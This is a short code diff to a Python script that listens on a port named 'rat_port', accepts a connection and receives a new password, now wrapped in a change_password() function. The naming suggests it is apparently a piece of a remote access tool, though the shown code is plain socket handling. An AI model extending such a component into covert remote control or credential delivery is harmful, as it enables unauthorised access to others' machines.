@@ -2,16 +2,19 @@ import socket
 
 from constants import *
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # noqa
 
-s.bind((host, rat_port))
-s.listen()
+def change_password():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # noqa
 
-print("[*] Waiting for the server...")
-client, addr = s.accept()
+	s.bind((host, rat_port))
+	s.listen()
 
-new_password = client.recv(MAX_PASSWORD_BYTES)
-print(f"[*] Connection is established successfully")
-print(new_password.decode())
+	print("[*] Waiting for the server...")
+	client, addr = s.accept()
 
-s.close()
+	new_password = client.recv(MAX_PASSWORD_BYTES).decode()
+	print(f"[*] Connection is established successfully")
+	s.close()
+
+	# print(new_password)
+	return new_password
